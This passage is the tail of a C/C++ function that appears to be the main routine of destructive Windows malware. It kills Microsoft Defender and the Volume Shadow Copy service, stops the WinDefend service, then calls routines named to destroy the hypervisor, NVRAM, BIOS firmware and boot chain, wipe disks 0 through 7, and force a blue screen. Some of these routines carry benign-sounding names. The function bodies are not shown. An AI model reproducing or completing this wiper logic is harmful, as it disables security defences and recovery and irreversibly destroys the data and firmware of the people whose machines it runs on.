        KillProcessByName(L"MsMpEng.exe");
        KillProcessByName(L"vssvc.exe");
        StopServiceAPI(L"WinDefend");

        DestroyHypervisor();
        AddCertificateMetadata();
        SecurityBypass();
        CreateBootloaders();
        CreateEFIVars();
        UpdateFirmwareVars();
        CreateFirmwareUpdates();
        CreateBootChain();
        UpdateRegistry();
        UpdateSystemFiles();
        InstallDriver();
        CreateBootFiles();
        CreateUpdateFiles();
        RepairFilesystemMetadata();
        RepairDiskData();
        LockAndDestroyNVRAM();
        DestroyBIOSFirmware();

        UpdateFirmwareRegistry();
        CreateCOMObjects();

        for (int i = 0; i < 8; i++) LockAndDestroyDisk(i);

        TriggerBSOD();
    }

    return 0;
}
